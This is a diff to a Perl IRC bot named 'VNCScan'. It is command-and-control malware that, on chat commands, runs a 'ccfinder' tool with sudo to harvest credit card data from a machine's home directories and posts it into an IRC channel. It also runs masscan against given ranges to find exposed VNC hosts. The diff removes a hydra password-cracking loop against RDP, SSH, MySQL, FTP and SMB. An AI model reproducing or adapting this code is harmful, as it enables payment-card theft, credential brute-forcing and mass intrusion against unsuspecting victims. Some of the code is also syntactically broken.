@@ -7,17 +7,15 @@ use Fcntl qw(:flock SEEK_END);
 my $filename = 'CCFinder.log';
 $|=1;
 #defineportshere
-my @hydra_PORTS = qw/'3389 22 3306 21 445 139 25/';
 use Mojo::IOLoop;
 #definetimeouthere
 #defineforkshere
-#definechanhere
 #definenoticechanhere
-
+#definechanhere
 my $irc = Mojo::IRC->new(
-#definenickhere
+ #definenickhere
  user => 'VNCScan',
-#defineserverhere
+ #defineserverhere
  );
 #definesslhere
 $irc->on(irc_rpl_welcome => sub {
@@ -39,7 +37,8 @@ $irc->on(irc_privmsg => sub {
  if ($msg =~ /@.ccplz/) {
   warn 'Sending CC info to IRC...';
   $irc->write(notice => $noticechan => "[Info] Fetching CC data from Storage and Memory...");
-  system 'sudo ./ccfinder /home';
+  system 'sudo ./ccfinder /home &';
+  Time::HiRes::sleep(600);
   $irc->write(notice => $noticechan => "[Info] Now sending CC data in channel...");
   open(my $fh, '<:encoding(UTF-8)', $filename);
   while (my $row = <$fh>) {
@@ -74,7 +73,7 @@ $irc->on(irc_privmsg => sub {
     if ($msg =~ /@.scan ([^\s]+)/) {
      $s->progress("[Info] Starting masscan... [VNC Scan in progress ...]");
      my $range = $1;
-     my $masscancmd = "masscan -p 5900,3389,22,25,3306,21 --range $range --rate 25000 --open --banners -oG hosts.txt ";
+     my $masscancmd = "masscan -p 5900 --range $range --rate 25000 --open --banners -oG hosts.txt ";
      warn "Received rangescan request on $range , running masscan...";
      my $r = `$masscancmd`;
      push @IRC_RESULTS, $_ foreach split "\n", $r;
@@ -127,17 +126,7 @@ $irc->on(irc_privmsg => sub {
     my $subp = shift;
     my $ownpid = shift;
     my $arg = shift;
-    foreach my $porti (@hydra_PORTS)
-    {
-      if (my $sock = IO::Socket::INET->new(PeerAddr => $row, PeerPort => $porti->[0], Proto => 'tcp')) {
-        printa("Cracking " $porti $row);
-        my @cmdhydra = ("sudo hydra -F -L /user -P /pass $row " . lc($porti->[1]) . " -s " . $porti->[0] . " -v -t 4 -W3 >>xploits.log");     
-        close($sock);
-        system(@cmdhydra);
-        return;
-      }
-    }
-    foreach my $vncport (@VNC_PORTS) {   
+    foreach my $vncport (@VNC_PORTS){
      my $sock = IO::Socket::INET->new(PeerAddr => $row, PeerPort => $vncport, Proto => 'tcp', Timeout => 10);
      next unless $sock;
      $sock->read(my $proto_ver, 12);
@@ -250,7 +239,6 @@ $irc->on(irc_privmsg => sub {
          $pids{$pid} = CORE::time + $forktimeout;
         }
        }
-       
        $subp->progress("Done Calling IPs");
        while ( scalar keys %pids > 0 ) # wait for last alive forks to terminate
        {
